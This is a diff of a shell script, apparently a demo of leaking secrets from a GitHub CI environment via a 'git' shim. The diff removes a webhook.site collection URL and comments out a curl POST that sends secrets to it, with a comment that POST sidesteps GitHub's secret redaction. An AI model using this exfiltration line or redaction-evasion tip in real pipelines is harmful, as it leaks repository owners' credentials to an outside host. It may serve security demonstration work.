@@ -2,11 +2,14 @@
 
 # XXX: run with sudo
 
-URL='https://webhook.site/cda7d12b-a48b-4703-a02f-ef32abb61eff'
+URL='https://localhost'
 
 leak() {
+  # will redact secrets, but suffices for a demo.
   echo "$1"
-  curl --no-progress-meter -X POST "$URL" --data-binary "$1" -H "Content-Type: application/octet-stream"
+  
+  # XXX: POST can be used to sidestep github's secret redaction
+  # curl --no-progress-meter -X POST "$URL" --data-binary "$1" -H "Content-Type: application/octet-stream"
 }
 
 if [[ "$(basename $0)" = git ]]; then
